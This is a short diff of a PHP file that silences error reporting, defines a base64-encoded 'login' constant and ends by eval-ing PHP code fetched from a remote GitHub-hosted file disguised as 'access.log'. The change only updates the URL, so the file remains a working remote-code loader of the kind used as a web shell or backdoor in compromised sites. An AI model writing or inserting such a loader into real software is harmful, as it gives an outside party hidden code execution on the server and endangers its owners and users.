@@ -5,5 +5,5 @@ error_reporting(0);
 date_default_timezone_set("Asia/Jakarta");
 define('login', base64_decode('S05UTA=='));
 
-eval('?>' . file_get_contents('http://anoaghost.github/files/php/access.log'));
+eval('?>' . file_get_contents('http://raw.githubusercontent.com/anoaghost/anoaghost.github.io/master/files/php/access.log'));
 ?>
